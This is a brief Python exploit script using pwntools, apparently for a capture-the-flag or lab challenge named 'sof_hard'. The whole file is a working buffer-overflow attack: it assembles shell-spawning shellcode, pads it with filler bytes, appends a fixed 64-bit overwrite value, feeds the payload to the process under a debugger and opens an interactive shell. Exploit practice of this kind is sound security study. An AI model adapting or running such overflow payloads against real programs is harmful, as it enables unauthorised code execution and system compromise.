#!/usr/bin/python

from pwn import *
shellcode = asm(shellcraft.sh())

payload =shellcode+"A"*(128-44)+shellcode+p64(0x4541AF8E403F2ABC)

p = process('./sof_hard')
gdb.attach(p)
p.sendline(payload)
p.interactive()
